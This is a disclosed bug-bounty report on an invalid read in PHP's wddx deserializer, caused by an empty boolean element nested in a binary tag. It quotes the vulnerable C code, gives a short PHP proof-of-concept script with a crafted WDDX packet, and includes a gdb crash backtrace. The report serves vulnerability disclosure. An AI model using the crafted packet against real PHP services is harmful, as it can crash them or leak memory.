# Invalid read when wddx decodes empty boolean element

## Report Details
- **Report ID**: 188661
- **URL**: https://hackerone.com/reports/188661
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-12-06T09:01:56.225Z
- **Disclosed**: 2019-11-12T09:20:07.865Z

## Reporter
- **Username**: fosec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Description
-----------
I have found some vulnerable code in wddx extension. The trouble happens when trying to process 'boolean' tag. If I open <boolean> tag without data, new st_entry item WILL NOT be pushed into stack. When <boolean> tag is closed and stack->top is greater than 1, st_entry item at top of stack WILL be popped out of stack.

Look at following snip code, a new st_entry will be pushed into stack if atts is not NULL. If I open <boolean> tag by using '<boolean/>', 'atts' is NULL.

``` c
static void php_wddx_push_element(void *user_data, const XML_Char *name, const XML_Char **atts)
{
	.....
	} else if (!strcmp((char *)name, EL_BOOLEAN)) {
		int i;

		if (atts) for (i = 0; atts[i]; i++) {
			if (!strcmp((char *)atts[i], EL_VALUE) && atts[i+1] && atts[i+1][0]) {
				ent.type = ST_BOOLEAN;
				SET_STACK_VARNAME;

				ZVAL_TRUE(&ent.data);
				wddx_stack_push((wddx_stack *)stack, &ent, sizeof(st_entry));
				php_wddx_process_data(user_data, atts[i+1], strlen((char *)atts[i+1]));
				break;
			}
		}
	} 
    .....
}
```

Look at the other snip code, I see "boolean" tag is popped and freed without checking anything:

``` c
static void php_wddx_pop_element(void *user_data, const XML_Char *name)
{
	st_entry 			*ent1, *ent2;
	wddx_stack 			*stack = (wddx_stack *)user_data;


	if (!strcmp((char *)name, EL_STRING) || !strcmp((char *)name, EL_NUMBER) ||
		!strcmp((char *)name, EL_BOOLEAN) || !strcmp((char *)name, EL_NULL) ||
	  	!strcmp((char *)name, EL_ARRAY) || !strcmp((char *)name, EL_STRUCT) ||
		!strcmp((char *)name, EL_RECORDSET) || !strcmp((char *)name, EL_BINARY) ||
		!strcmp((char *)name, EL_DATETIME)) {
		wddx_stack_top(stack, (void**)&ent1);
		...

		if (stack->top > 1) {
			stack->top--;
			wddx_stack_top(stack, (void**)&ent2);
            .....
			efree(ent1);
		} else {
			stack->done = 1;
		}
	}
    ....
}
```

Test script
-----------
``` php
<?php
$xml = <<<EOF
<?xml version="1.0" ?>
<wddxPacket version="1.0">
<number>2261634.5098039215</number>
<binary><boolean/></binary>
</wddxPacket>
EOF;
$wddx = wddx_deserialize($xml);
var_dump($wddx);
?>
```

When processing `binary` tag, a `st_entry` which describes `binary` tag is pushed to stack. `<boolean/>` will lead to `st_entry` of `binary` tag is popped out. When processing `</binary>`, `php_wddx_pop_element()` function is called. `php_wddx_pop_element` will take top of stack and use it as a string object, try to decode it. We can use this issue to read anything at anywhere. If this value is not a valid memory address, it will lead to memory corruption.

Below backtrace of gdb will give you details.

```
[-------------------------------------code-------------------------------------]
   0x82cf418 <php_wddx_pop_element+440>:        mov    eax,DWORD PTR [ebx]
=> 0x82cf41a <php_wddx_pop_element+442>:        mov    edx,DWORD PTR [eax+0xc]
   0x82cf41d <php_wddx_pop_element+445>:        add    eax,0x10
   0x82cf420 <php_wddx_pop_element+448>:        mov    DWORD PTR [esp],eax
   0x82cf423 <php_wddx_pop_element+451>:        mov    DWORD PTR [esp+0x4],edx
   0x82cf427 <php_wddx_pop_element+455>:        call   0x82702f0 <php_base64_decode>
[------------------------------------stack-------------------------------------]
0000| 0xbfffbce0 --> 0x89b92d4 ("boolean")
0004| 0xbfffbce4 --> 0xb7870080 --> 0x0
0008| 0xbfffbce8 --> 0x89b8568 --> 0x8931938 --> 0x0
0012| 0xbfffbcec --> 0xb7c66458 (<__GI___libc_malloc+8>:        add    ebx,0x140ba8)
0016| 0xbfffbcf0 --> 0xb7f1e000 --> 0x15adac
0020| 0xbfffbcf4 --> 0xb7d371bf (<__memcpy_ssse3_rep+31>:       add    ebx,0x31501)
0024| 0xbfffbcf8 --> 0xb7f1e000 --> 0x15adac
0028| 0xbfffbcfc --> 0xb7e6409b (<xmlStrndup__internal_alias+75>:       mov    eax,edi)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
php_wddx_pop_element (user_data=0xbfffbf6c, name=<optimized out>) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:905
905                             zend_string *new_str = php_base64_decode(
gdb-peda$ bt
#0  php_wddx_pop_element (user_data=0xbfffbf6c, name=<optimized out>) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:905
#1  0x082d602b in _end_element_handler (user=0xb7870080, name=0x89b92cd "binary") at /root/fuzzer/PHP-7.1/ext/xml/compat.c:219
#2  0xb7df9302 in xmlParseEndTag1 (ctxt=ctxt@entry=0x89b8568, line=line@entry=0x0) at parser.c:8796
#3  0xb7e01c89 in xmlParseTryOrFinish (ctxt=ctxt@entry=0x89b8568, terminate=terminate@entry=0x1) at parser.c:11743
#4  0xb7e02da3 in xmlParseChunk__internal_alias (ctxt=0x89b8568,
    chunk=chunk@entry=0xb78661f0 "<?xml version=\"1.0\" ?>\r\n<wddxPacket version=\"1.0\">\r\n<number>2261634.5098039215</number>\r\n<binary><boolean/></binary>\r\n</wddxPacket>", size=size@entry=0x83,
    terminate=terminate@entry=0x1) at parser.c:12446
#5  0x082d6336 in php_XML_Parse (parser=parser@entry=0xb7870080,
    data=data@entry=0xb78661f0 "<?xml version=\"1.0\" ?>\r\n<wddxPacket version=\"1.0\">\r\n<number>2261634.5098039215</number>\r\n<binary><boolean/></binary>\r\n</wddxPacket>", data_len=data_len@entry=0x83,
    is_final=is_final@entry=0x1) at /root/fuzzer/PHP-7.1/ext/xml/compat.c:600
#6  0x082d1904 in php_wddx_deserialize_ex (
    value=value@entry=0xb78661f0 "<?xml version=\"1.0\" ?>\r\n<wddxPacket version=\"1.0\">\r\n<number>2261634.5098039215</number>\r\n<binary><boolean/></binary>\r\n</wddxPacket>", vallen=0x83,
    return_value=return_value@entry=0xb7814080) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:1095
#7  0x082d1ba7 in zif_wddx_deserialize (execute_data=0xb78140b0, return_value=0xb7814080) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:1313
#8  0x0838b6c6 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER () at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:675
#9  0x0837c322 in execute_ex (ex=0xb7814020) at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:429
#10 0x083cb3bb in zend_execute (op_array=op_array@entry=0xb7865180, return_value=return_value@entry=0x0) at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:474
#11 0x0833bb40 in zend_execute_scripts (type=type@entry=0x8, retval=retval@entry=0x0, file_count=file_count@entry=0x3) at /root/fuzzer/PHP-7.1/Zend/zend.c:1474
#12 0x082dd0cb in php_execute_script (primary_file=primary_file@entry=0xbfffe2b8) at /root/fuzzer/PHP-7.1/main/main.c:2533
#13 0x083cd70a in do_cli (argc=argc@entry=0x3, argv=argv@entry=0x88eca80) at /root/fuzzer/PHP-7.1/sapi/cli/php_cli.c:990
#14 0x0806d544 in main (argc=0x3, argv=0x88eca80) at /root/fuzzer/PHP-7.1/sapi/cli/php_cli.c:1378
#15 0xb7c07943 in __libc_start_main (main=0x806d070 <main>, argc=0x3, ubp_av=0xbffff564, init=0x83d5260 <__libc_csu_init>, fini=0x83d52d0 <__libc_csu_fini>, rtld_fini=0xb7fee700 <_dl_fini>,
    stack_end=0xbffff55c) at libc-start.c:274
#16 0x0806d5d1 in _start ()
gdb-peda$ i r $eax
eax            0x41414141       0x41414141
gdb-peda$
```

## Attachments
No attachments
